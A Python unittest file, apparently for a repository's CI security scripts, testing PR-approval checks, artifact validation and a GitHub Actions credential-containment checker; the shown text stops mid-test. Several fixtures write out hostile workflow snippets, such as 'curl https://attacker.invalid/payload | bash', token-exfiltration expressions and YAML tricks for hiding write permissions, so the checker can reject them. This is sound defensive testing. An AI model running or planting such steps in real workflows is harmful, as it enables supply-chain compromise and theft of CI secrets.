from __future__ import annotations

import io
import json
import os
import shutil
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest.mock import patch


sys.dont_write_bytecode = True
REPOSITORY_ROOT = Path(__file__).resolve().parents[2]
SCRIPTS = REPOSITORY_ROOT / ".github" / "scripts"
sys.path.insert(0, str(SCRIPTS))

from fetch_ai_review_context import (  # noqa: E402
    ContextError,
    authenticate_current_run,
    extract_context_json,
    materialize_context,
    select_artifact,
    validate_context,
)
from check_credential_containment import FROZEN_TRUST_ROOTS, check_repository  # noqa: E402
from preview_comment import (  # noqa: E402
    COMMENT_MARKER,
    MAX_COMMENT_BYTES,
    PreviewCommentError,
    authenticate_preview_run,
    extract_preview_artifact,
    select_preview_artifact,
    stage_body,
    validate_body,
    validate_preview_run_metadata,
)
from verify_pr_approval import (  # noqa: E402
    ApprovalError,
    load_and_verify_from_environment,
    verify_approval,
)


BASE_SHA = "a" * 40
HEAD_SHA = "b" * 40
NEW_HEAD_SHA = "c" * 40
MERGE_SHA = "d" * 40
HEAD_REPOSITORY = "rocky-data/rocky"
FORK_REPOSITORY = "contributor/rocky"


def pr_payload(*, head_sha: str = HEAD_SHA, base_sha: str = BASE_SHA) -> dict[str, object]:
    return {
        "state": "open",
        "head": {"sha": head_sha, "repo": {"full_name": HEAD_REPOSITORY}},
        "base": {
            "sha": base_sha,
            "ref": "main",
            "repo": {"full_name": HEAD_REPOSITORY},
        },
        "labels": [{"name": "ai-review"}],
    }


def context_payload(*, head_sha: str = HEAD_SHA) -> bytes:
    section = {"status": "ok", "content": "bounded", "error": ""}
    return json.dumps(
        {
            "schema_version": 1,
            "pull_request": {
                "number": 42,
                "base_sha": BASE_SHA,
                "head_sha": head_sha,
            },
            "sections": {
                "diff": section,
                "compile": section,
                "ci_diff": section,
                "lineage": section,
            },
        }
    ).encode()


class ApprovalPolicyTests(unittest.TestCase):
    def test_exact_approved_head_is_accepted(self) -> None:
        verify_approval(
            pr_payload(),
            approved_head_sha=HEAD_SHA,
            approved_base_sha=BASE_SHA,
            approved_base_ref="main",
            approved_base_repository=HEAD_REPOSITORY,
            approved_head_repository=HEAD_REPOSITORY,
            approval_label="ai-review",
        )

    def test_changed_head_cannot_reuse_prior_approval(self) -> None:
        with self.assertRaisesRegex(ApprovalError, "approval is stale"):
            verify_approval(
                pr_payload(head_sha=NEW_HEAD_SHA),
                approved_head_sha=HEAD_SHA,
                approved_base_sha=BASE_SHA,
                approved_head_repository=HEAD_REPOSITORY,
                approval_label="ai-review",
            )

    def test_removed_label_invalidates_approval(self) -> None:
        payload = pr_payload()
        payload["labels"] = []
        with self.assertRaisesRegex(ApprovalError, "label.*absent"):
            verify_approval(
                payload,
                approved_head_sha=HEAD_SHA,
                approval_label="ai-review",
            )

    def test_non_approval_consumer_can_validate_identity_without_a_label(self) -> None:
        payload = pr_payload()
        payload["labels"] = []
        verify_approval(
            payload,
            approved_head_sha=HEAD_SHA,
            approved_base_sha=BASE_SHA,
            approved_base_ref="main",
            approved_base_repository=HEAD_REPOSITORY,
            approved_head_repository=HEAD_REPOSITORY,
            approval_label=None,
        )

    def test_credentialed_recheck_requires_complete_base_and_head_identity(self) -> None:
        environment = {
            "GITHUB_REPOSITORY": HEAD_REPOSITORY,
            "PR_NUMBER": "42",
            "APPROVED_HEAD_SHA": HEAD_SHA,
            "GH_TOKEN": "test-token",
        }
        with patch.dict(os.environ, environment, clear=True):
            with self.assertRaisesRegex(ApprovalError, "APPROVED_BASE_SHA"):
                load_and_verify_from_environment()

        environment["APPROVED_BASE_SHA"] = BASE_SHA
        with patch.dict(os.environ, environment, clear=True):
            with self.assertRaisesRegex(ApprovalError, "APPROVED_BASE_REF"):
                load_and_verify_from_environment()

        environment["APPROVED_BASE_REF"] = "main"
        with patch.dict(os.environ, environment, clear=True):
            with self.assertRaisesRegex(ApprovalError, "APPROVED_BASE_REPOSITORY"):
                load_and_verify_from_environment()

        environment["APPROVED_BASE_REPOSITORY"] = HEAD_REPOSITORY
        with patch.dict(os.environ, environment, clear=True):
            with self.assertRaisesRegex(ApprovalError, "APPROVED_HEAD_REPOSITORY"):
                load_and_verify_from_environment()

    def test_non_main_base_is_rejected(self) -> None:
        payload = pr_payload()
        payload["base"] = {
            "sha": BASE_SHA,
            "ref": "unprotected",
            "repo": {"full_name": HEAD_REPOSITORY},
        }
        with self.assertRaisesRegex(ApprovalError, "base ref"):
            verify_approval(
                payload,
                approved_head_sha=HEAD_SHA,
                approved_base_sha=BASE_SHA,
                approved_base_ref="main",
                approved_base_repository=HEAD_REPOSITORY,
                approved_head_repository=HEAD_REPOSITORY,
                approval_label="ai-review",
            )

    def test_foreign_base_repository_is_rejected(self) -> None:
        payload = pr_payload()
        payload["base"] = {
            "sha": BASE_SHA,
            "ref": "main",
            "repo": {"full_name": "attacker/rocky"},
        }
        with self.assertRaisesRegex(ApprovalError, "base repository"):
            verify_approval(
                payload,
                approved_head_sha=HEAD_SHA,
                approved_base_sha=BASE_SHA,
                approved_base_ref="main",
                approved_base_repository=HEAD_REPOSITORY,
                approved_head_repository=HEAD_REPOSITORY,
                approval_label="ai-review",
            )


class ContextBoundaryTests(unittest.TestCase):
    def test_current_run_identity_accepts_both_live_api_path_shapes(self) -> None:
        for workflow_path in (
            ".github/workflows/ai-review.yml",
            ".github/workflows/ai-review.yml@main",
        ):
            with self.subTest(workflow_path=workflow_path):
                authenticate_current_run(
                    {
                        "id": 123,
                        "event": "pull_request_target",
                        "path": workflow_path,
                        "head_sha": BASE_SHA,
                        "actor": {"login": "trusted-reviewer"},
                        "head_repository": {"full_name": HEAD_REPOSITORY},
                    },
                    expected_run_id=123,
                    repository=HEAD_REPOSITORY,
                    approved_base_sha=BASE_SHA,
                    approver_login="trusted-reviewer",
                )

    def test_other_workflow_run_cannot_supply_context(self) -> None:
        with self.assertRaisesRegex(ContextError, "metadata"):
            authenticate_current_run(
                {
                    "id": 123,
                    "event": "pull_request_target",
                    "path": ".github/workflows/untrusted.yml@main",
                    "head_sha": BASE_SHA,
                    "actor": {"login": "trusted-reviewer"},
                    "head_repository": {"full_name": HEAD_REPOSITORY},
                },
                expected_run_id=123,
                repository=HEAD_REPOSITORY,
                approved_base_sha=BASE_SHA,
                approver_login="trusted-reviewer",
            )

    def test_non_main_workflow_ref_cannot_supply_context(self) -> None:
        with self.assertRaisesRegex(ContextError, "metadata"):
            authenticate_current_run(
                {
                    "id": 123,
                    "event": "pull_request_target",
                    "path": ".github/workflows/ai-review.yml@unprotected",
                    "head_sha": BASE_SHA,
                    "actor": {"login": "trusted-reviewer"},
                    "head_repository": {"full_name": HEAD_REPOSITORY},
                },
                expected_run_id=123,
                repository=HEAD_REPOSITORY,
                approved_base_sha=BASE_SHA,
                approver_login="trusted-reviewer",
            )

    def test_artifact_body_cannot_change_the_approved_head(self) -> None:
        with self.assertRaisesRegex(ContextError, "body metadata"):
            validate_context(
                context_payload(head_sha=NEW_HEAD_SHA),
                approved_base_sha=BASE_SHA,
                approved_head_sha=HEAD_SHA,
                pr_number=42,
            )

    def test_unexpected_archive_member_is_rejected(self) -> None:
        archive = io.BytesIO()
        with zipfile.ZipFile(archive, "w") as bundle:
            bundle.writestr("context.json", context_payload())
            bundle.writestr("run-me.sh", "echo unsafe")
        with self.assertRaisesRegex(ContextError, "only context.json"):
            extract_context_json(archive.getvalue())

    def test_oversized_artifact_is_rejected_before_download(self) -> None:
        with self.assertRaisesRegex(ContextError, "size"):
            select_artifact(
                {
                    "artifacts": [
                        {
                            "id": 1,
                            "name": f"rocky-ai-review-context-{HEAD_SHA}",
                            "expired": False,
                            "size_in_bytes": 10 * 1024 * 1024,
                        }
                    ]
                },
                expected_name=f"rocky-ai-review-context-{HEAD_SHA}",
            )

    def test_materialization_requires_runner_temp(self) -> None:
        with patch.dict(os.environ, {}, clear=True):
            with self.assertRaisesRegex(ContextError, "RUNNER_TEMP"):
                materialize_context({}, Path("context"))


class PreviewCommentBoundaryTests(unittest.TestCase):
    def test_exact_bounded_body_round_trips_through_staging(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            source = root / "rendered.md"
            source.write_bytes(f"{COMMENT_MARKER}\n## Preview\n".encode())
            with patch.dict(os.environ, {"RUNNER_TEMP": directory}, clear=True):
                staged = stage_body(source, root / "artifact")
                self.assertEqual(staged.name, "body.md")
                self.assertEqual(
                    validate_body(staged.read_bytes()),
                    f"{COMMENT_MARKER}\n## Preview\n",
                )
                self.assertEqual(staged.stat().st_mode & 0o777, 0o600)

    def test_preview_body_requires_one_exact_leading_marker(self) -> None:
        with self.assertRaisesRegex(PreviewCommentError, "leading marker"):
            validate_body(b"## Preview\n")
        with self.assertRaisesRegex(PreviewCommentError, "duplicate markers"):
            validate_body(
                f"{COMMENT_MARKER}\n## Preview\n{COMMENT_MARKER}\n".encode()
            )
        with self.assertRaisesRegex(PreviewCommentError, "byte limit"):
            validate_body(
                f"{COMMENT_MARKER}\n".encode()
                + b"x" * (MAX_COMMENT_BYTES + 1)
            )

    def test_workflow_run_and_artifact_are_bound_to_one_pull_request(self) -> None:
        identity = authenticate_preview_run(
            {
                "id": 123,
                "name": "rocky-preview",
                "event": "pull_request",
                "status": "completed",
                "conclusion": "success",
                "path": ".github/workflows/preview.yml@feature",
                "head_sha": HEAD_SHA,
                "head_repository": {"full_name": FORK_REPOSITORY},
                "repository": {"full_name": HEAD_REPOSITORY},
                "pull_requests": [
                    {
                        "number": 42,
                        "head": {
                            "sha": HEAD_SHA,
                            "repo": {
                                "url": f"https://api.github.com/repos/{FORK_REPOSITORY}"
                            },
                        },
                        "base": {
                            "sha": BASE_SHA,
                            "repo": {
                                "url": f"https://api.github.com/repos/{HEAD_REPOSITORY}"
                            },
                        },
                    }
                ],
            },
            expected_run_id=123,
            repository=HEAD_REPOSITORY,
            api_url="https://api.github.com",
        )
        self.assertEqual(identity.pr_number, 42)
        self.assertEqual(identity.head_sha, HEAD_SHA)
        self.assertEqual(identity.base_sha, BASE_SHA)
        self.assertEqual(identity.head_repository, FORK_REPOSITORY)
        artifact = select_preview_artifact(
            {
                "artifacts": [
                    {
                        "id": 9,
                        "name": "rocky-preview-comment",
                        "expired": False,
                        "size_in_bytes": 1024,
                        "workflow_run": {"id": 123, "head_sha": HEAD_SHA},
                    }
                ]
            },
            source_run_id=123,
            workflow_head_sha=HEAD_SHA,
        )
        self.assertEqual(artifact["id"], 9)

        metadata = {
            "schema_version": 1,
            "pull_request": {
                "number": 42,
                "base_repository": HEAD_REPOSITORY,
                "base_sha": BASE_SHA,
                "head_repository": FORK_REPOSITORY,
                "head_sha": HEAD_SHA,
            },
            "workflow_head_sha": HEAD_SHA,
        }
        validate_preview_run_metadata(metadata, identity=identity)
        metadata["workflow_head_sha"] = MERGE_SHA
        with self.assertRaisesRegex(PreviewCommentError, "workflow run"):
            validate_preview_run_metadata(metadata, identity=identity)

        fork_run_without_association = {
            "id": 124,
            "name": "rocky-preview",
            "event": "pull_request",
            "status": "completed",
            "conclusion": "success",
            "path": ".github/workflows/preview.yml@feature",
            "head_sha": HEAD_SHA,
            "head_repository": {"full_name": FORK_REPOSITORY},
            "repository": {"full_name": HEAD_REPOSITORY},
            "pull_requests": [],
        }
        fork_identity = authenticate_preview_run(
            fork_run_without_association,
            expected_run_id=124,
            repository=HEAD_REPOSITORY,
            api_url="https://api.github.com",
        )
        self.assertIsNone(fork_identity.pr_number)
        self.assertIsNone(fork_identity.base_sha)
        metadata["workflow_head_sha"] = HEAD_SHA
        validate_preview_run_metadata(metadata, identity=fork_identity)

    def test_preview_workflow_artifact_is_data_only_and_exact(self) -> None:
        metadata = {
            "schema_version": 1,
            "pull_request": {
                "number": 42,
                "base_repository": HEAD_REPOSITORY,
                "base_sha": BASE_SHA,
                "head_repository": HEAD_REPOSITORY,
                "head_sha": HEAD_SHA,
            },
            "workflow_head_sha": NEW_HEAD_SHA,
        }
        archive = io.BytesIO()
        with zipfile.ZipFile(archive, "w") as bundle:
            bundle.writestr("body.md", f"{COMMENT_MARKER}\n## Preview\n")
            bundle.writestr("metadata.json", json.dumps(metadata))
        body, parsed = extract_preview_artifact(archive.getvalue())
        self.assertEqual(body, f"{COMMENT_MARKER}\n## Preview\n")
        self.assertEqual(parsed, metadata)

        archive = io.BytesIO()
        with zipfile.ZipFile(archive, "w") as bundle:
            bundle.writestr("body.md", f"{COMMENT_MARKER}\n## Preview\n")
            bundle.writestr("metadata.json", json.dumps(metadata))
            bundle.writestr("payload.sh", "exit 1\n")
        with self.assertRaisesRegex(PreviewCommentError, "only body.md and metadata.json"):
            extract_preview_artifact(archive.getvalue())


class CredentialContainmentPolicyTests(unittest.TestCase):
    def check_fixture(self, name: str, text: str) -> list[str]:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            workflows = root / ".github" / "workflows"
            workflows.mkdir(parents=True)
            (workflows / name).write_text(text)
            return check_repository(root)

    def read(self, relative_path: str) -> str:
        return (REPOSITORY_ROOT / relative_path).read_text()

    def test_repository_policy_accepts_the_hardened_workflows(self) -> None:
        self.assertEqual(check_repository(REPOSITORY_ROOT), [])

    def test_deleting_the_policy_workflow_fails_closed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            workflows = root / ".github" / "workflows"
            workflows.mkdir(parents=True)
            for name in (
                "ai-review.yml",
                "engine-evals.yml",
                "engine-evals-live.yml",
                "preview.yml",
            ):
                (workflows / name).write_text(
                    self.read(f".github/workflows/{name}")
                )
            violations = check_repository(root)
        self.assertTrue(
            any("ci-security-policy.yml" in item and "missing" in item for item in violations)
        )

    def test_mutable_local_action_in_credential_job_is_rejected(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "uses: ./trusted/.github/actions/rocky-ai-review",
            "uses: ./.github/actions/rocky-ai-review",
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("non-allow-listed action" in item for item in violations))

    def test_workflow_sha_must_belong_to_the_checkout_step(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "ref: ${{ github.workflow_sha }}",
            "ref: ${{ github.event.pull_request.head.sha }}\n"
            "          show-progress: ${{ github.workflow_sha != '' }}",
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("must use github.workflow_sha" in item for item in violations))

    def test_differently_named_candidate_payload_is_rejected(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml")
        hostile_step = (
            "      - name: Innocent-looking helper\n"
            "        run: bash alternate-input/collect.sh\n\n"
        )
        workflow = workflow.replace(
            "      # The composite action performs one more live head/label check",
            hostile_step
            + "      # The composite action performs one more live head/label check",
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("non-allow-listed run script" in item for item in violations))

    def test_short_form_run_step_cannot_enter_the_ai_credential_job(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "    steps:\n      - name: Check out trusted review tooling",
            "    steps:\n"
            "      - run: curl https://attacker.invalid/payload | bash\n"
            "      - name: Check out trusted review tooling",
            1,
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("steps are not exact" in item for item in violations))
        self.assertTrue(any("non-allow-listed run script" in item for item in violations))

    def test_quoted_run_step_cannot_enter_the_ai_credential_job(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "    steps:\n      - name: Check out trusted review tooling",
            "    steps:\n"
            "      - 'run': curl https://attacker.invalid/payload | bash\n"
            "      - name: Check out trusted review tooling",
            1,
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("steps are not exact" in item for item in violations))
        self.assertTrue(any("non-allow-listed run script" in item for item in violations))

    def test_ai_validator_cannot_be_disabled_by_removing_the_secret(self) -> None:
        prefix, privileged = self.read(".github/workflows/ai-review.yml").split(
            "  ai-review:\n", maxsplit=1
        )
        privileged = privileged.replace(
            "    environment:\n      name: credentialed-pr-review\n", "", 1
        ).replace("      contents: read", "      contents: write", 1)
        privileged = privileged.replace(
            "          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}",
            "          payload_path: candidate/run.sh",
            1,
        )
        violations = self.check_fixture(
            "ai-review.yml", prefix + "  ai-review:\n" + privileged
        )
        self.assertTrue(any("credentialed-pr-review" in item for item in violations))
        self.assertTrue(any("permissions are not exact" in item for item in violations))
        self.assertTrue(any("model key exactly once" in item for item in violations))

    def test_invalidation_job_cannot_execute_a_mutable_action(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3",
            "uses: ./candidate/remove-label",
            1,
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("invalidation action source" in item for item in violations))

    def test_ai_review_concurrency_group_is_exact(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "group: rocky-ai-review-${{ github.event.pull_request.number }}",
            "group: rocky-ai-review-global",
            1,
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("concurrency is not exact" in item for item in violations))

    def test_ai_review_concurrency_must_cancel_stale_runs(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "cancel-in-progress: true",
            "cancel-in-progress: false",
            1,
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("concurrency is not exact" in item for item in violations))

    def test_ai_review_top_level_shape_is_exact(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "permissions: {}",
            "timeout-minutes: 30\npermissions: {}",
            1,
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("workflow keys are not exact" in item for item in violations))

    def test_privileged_job_cannot_hide_a_container_with_a_quoted_key(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n"
            "    'container': attacker.invalid/image:latest\n",
            1,
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("quoted YAML key" in item for item in violations))

    def test_privileged_workflow_cannot_hide_top_level_defaults(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "permissions: {}\n",
            "'defaults':\n"
            "  run:\n"
            "    shell: attacker-shell {0}\n\n"
            "permissions: {}\n",
            1,
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("quoted YAML key" in item for item in violations))

    def test_pr_eval_cannot_gain_an_alternate_secret(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n"
            "    env:\n"
            "      ALTERNATE_TOKEN: ${{ secrets.ALTERNATE_TOKEN }}\n",
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("not allow-listed" in item for item in violations))

    def test_workflow_level_secret_cannot_reach_candidate_context(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "permissions: {}\n",
            "env:\n"
            "  ALTERNATE_TOKEN: ${{ secrets.ALTERNATE_TOKEN }}\n\n"
            "permissions: {}\n",
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(
            any("outside a classified job" in item for item in violations)
        )

    def test_candidate_eval_cannot_regain_a_write_token(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "  contents: read",
            "  contents: write",
            1,
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("write token permissions" in item for item in violations))

    def test_quoted_write_permission_is_rejected(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "  contents: read",
            '  contents: "write"',
            1,
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("write token permissions" in item for item in violations))

    def test_quoted_job_permission_key_cannot_hide_write_access(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n"
            "    'permissions':\n"
            "      contents: write\n",
            1,
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("quoted YAML key" in item for item in violations))
        self.assertTrue(any("non-canonical token permissions" in item for item in violations))

    def test_block_scalar_top_level_permission_fails_closed(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "permissions:\n  contents: read",
            "permissions:\n  contents: >-\n    write",
            1,
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("non-canonical token permissions" in item for item in violations))

    def test_block_scalar_job_permission_fails_closed(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n"
            "    permissions:\n"
            "      contents: >-\n"
            "        write\n",
            1,
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("non-canonical token permissions" in item for item in violations))

    def test_tagged_permission_value_fails_closed(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "  contents: read", "  contents: !!str write", 1
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("unsupported YAML tag" in item for item in violations))
        self.assertTrue(any("non-canonical token permissions" in item for item in violations))

    def test_candidate_checkout_cannot_persist_the_token(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "persist-credentials: false",
            "persist-credentials: true",
            1,
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("persists or omits" in item for item in violations))

    def test_candidate_checkout_cannot_override_the_github_server(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "          allow-unsafe-pr-checkout: true\n",
            "          allow-unsafe-pr-checkout: true\n"
            "          github-server-url: https://attacker.invalid\n",
            1,
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("overrides a credential input" in item for item in violations))
        self.assertTrue(any("no exact candidate checkout" in item for item in violations))

    def test_candidate_job_cannot_explicitly_consume_the_token(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n"
            "    env:\n"
            "      GH_TOKEN: ${{ github['token'] }}\n",
            1,
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("explicitly consumes" in item for item in violations))

    def test_candidate_job_cannot_consume_the_whole_github_context(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n"
            "    env:\n"
            "      WHOLE_CONTEXT: ${{ toJSON(github) }}\n",
            1,
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("explicitly consumes" in item for item in violations))

    def test_candidate_job_cannot_compute_the_token_property(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n"
            "    env:\n"
            "      GH_TOKEN: ${{ github[format('to{0}', 'ken')] }}\n",
            1,
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("explicitly consumes" in item for item in violations))

    def test_candidate_job_cannot_filter_the_whole_github_context(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n"
            "    env:\n"
            "      WHOLE_CONTEXT: ${{ join(github.*, '|') }}\n",
            1,
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("explicitly consumes" in item for item in violations))

    def test_candidate_checkout_requires_repository_and_exact_sha(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "repository: ${{ github.event.pull_request.head.repo.full_name }}",
            "repository: ${{ github.repository }}",
            1,
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("no exact candidate checkout" in item for item in violations))

    def test_candidate_checkout_identity_cannot_be_supplied_by_decoy_lines(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "repository: ${{ github.event.pull_request.head.repo.full_name }}",
            "repository: ${{ github.repository }}",
            1,
        ).replace(
            "ref: ${{ github.event.pull_request.head.sha }}",
            "ref: ${{ github.workflow_sha }}\n"
            "          decoy: |\n"
            "            repository: ${{ github.event.pull_request.head.repo.full_name }}\n"
            "            ref: ${{ github.event.pull_request.head.sha }}\n"
            "            allow-unsafe-pr-checkout: true",
            1,
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("inputs are non-canonical" in item for item in violations))
        self.assertTrue(any("no exact candidate checkout" in item for item in violations))

    def test_persistence_decoy_cannot_replace_the_real_checkout_input(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "          persist-credentials: false\n",
            "          decoy: |\n"
            "            persist-credentials: false\n",
            1,
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("inputs are non-canonical" in item for item in violations))
        self.assertTrue(any("persists or omits" in item for item in violations))

    def test_quoted_credential_job_cannot_evade_classification(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "jobs:\n",
            "jobs:\n"
            "  'shadow':\n"
            "    runs-on: ubuntu-latest\n"
            "    env:\n"
            "      ALTERNATE_TOKEN: ${{ secrets.ALTERNATE_TOKEN }}\n",
            1,
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(
            any("shadow" in item and "not allow-listed" in item for item in violations)
        )

    def test_yaml_extension_with_pr_secret_is_rejected(self) -> None:
        workflow = """\
name: hostile
on: {pull_request: {types: [opened]}}
jobs:
  collect:
    runs-on: ubuntu-latest
    steps:
      - run: ./payload/run.sh
        env:
          ALTERNATE_TOKEN: ${{ secrets.ALTERNATE_TOKEN }}
"""
        violations = self.check_fixture("hostile.yaml", workflow)
        self.assertTrue(any("canonical block mapping" in item for item in violations))

    def test_block_sequence_pull_request_event_is_classified(self) -> None:
        workflow = """\
name: hostile
on:
  - pull_request
permissions: {}
jobs:
  collect:
    runs-on: ubuntu-latest
    env:
      ALTERNATE_TOKEN: ${{ secrets.ALTERNATE_TOKEN }}
    steps:
      - run: ./payload/run.sh
"""
        violations = self.check_fixture("hostile.yaml", workflow)
        self.assertTrue(any("canonical block mapping" in item for item in violations))

    def test_brand_new_pr_workflow_cannot_gain_a_write_token(self) -> None:
        workflow = """\
name: hostile
on:
  pull_request_target:
permissions:
  contents: write
jobs:
  payload:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: ./payload/run.sh
"""
        violations = self.check_fixture("hostile.yaml", workflow)
        self.assertTrue(any("write token permissions" in item for item in violations))
        self.assertTrue(any("persists or omits" in item for item in violations))

    def test_flow_style_pr_jobs_fail_closed(self) -> None:
        workflow = """\
name: hostile
on:
  pull_request_target:
permissions: {contents: write}
jobs: {payload: {runs-on: ubuntu-latest, steps: [{run: ./payload/run.sh}]}}
"""
        violations = self.check_fixture("hostile.yaml", workflow)
        self.assertTrue(any("canonical block form" in item for item in violations))

    def test_flow_style_individual_pr_job_fails_closed(self) -> None:
        workflow = (
            "name: hostile\n"
            "on:\n"
            "  pull_request_target:\n"
            "permissions: {}\n"
            "jobs:\n"
            "  payload: {runs-on: ubuntu-latest, permissions: {contents: write}, "
            "steps: [{run: ./payload/run.sh}]}\n"
        )
        violations = self.check_fixture("hostile.yaml", workflow)
        self.assertTrue(any("job definitions" in item for item in violations))

    def test_event_alias_fails_closed(self) -> None:
        workflow = """\
name: hostile
events: &pr-events [pull_request_target]
on: *pr-events
permissions: {}
jobs:
  payload:
    runs-on: ubuntu-latest
    steps:
      - run: ./payload/run.sh
"""
        violations = self.check_fixture("hostile.yaml", workflow)
        self.assertTrue(any("anchor or alias" in item for item in violations))

    def test_inline_event_alias_fails_closed(self) -> None:
        workflow = """\
name: &event pull_request_target
on: [*event]
permissions:
  contents: write
jobs:
  payload:
    runs-on: ubuntu-latest
    steps:
      - run: ./payload/run.sh
"""
        violations = self.check_fixture("hostile.yaml", workflow)
        self.assertTrue(any("anchor or alias" in item for item in violations))

    def test_numeric_event_alias_fails_closed(self) -> None:
        workflow = """\
name: &1 pull_request_target
on: [*1]
permissions:
  contents: write
jobs:
  payload:
    runs-on: ubuntu-latest
    steps:
      - run: ./payload/run.sh
"""
        violations = self.check_fixture("hostile.yaml", workflow)
        self.assertTrue(any("anchor or alias" in item for item in violations))

    def test_tagged_event_key_fails_closed(self) -> None:
        workflow = """\
name: hostile
!!str on: [pull_request_target]
permissions:
  contents: write
jobs:
  payload:
    runs-on: ubuntu-latest
    steps:
      - run: ./payload/run.sh
"""
        violations = self.check_fixture("hostile.yaml", workflow)
        self.assertTrue(any("unsupported YAML tag" in item for item in violations))

    def test_numeric_tagged_event_key_fails_closed(self) -> None:
        workflow = """\
name: hostile
!1 on: [pull_request_target]
permissions:
  contents: write
jobs:
  payload:
    runs-on: ubuntu-latest
    steps:
      - run: ./payload/run.sh
"""
        violations = self.check_fixture("hostile.yaml", workflow)
        self.assertTrue(any("unsupported YAML tag" in item for item in violations))

    def test_preview_commenter_cannot_execute_candidate_payload(self) -> None:
        workflow = self.read(".github/workflows/preview-comment.yml").replace(
            "run: python3 trusted/.github/scripts/preview_comment.py post-workflow-run",
            "run: ./candidate/post-comment.sh",
            1,
        )
        violations = self.check_fixture("preview-comment.yml", workflow)
        self.assertTrue(any("non-allow-listed run script" in item for item in violations))

    def test_preview_producer_stages_the_api_head_sha_not_the_merge_sha(self) -> None:
        workflow = self.read(".github/workflows/preview.yml").replace(
            "WORKFLOW_HEAD_SHA: ${{ github.event.pull_request.head.sha }}",
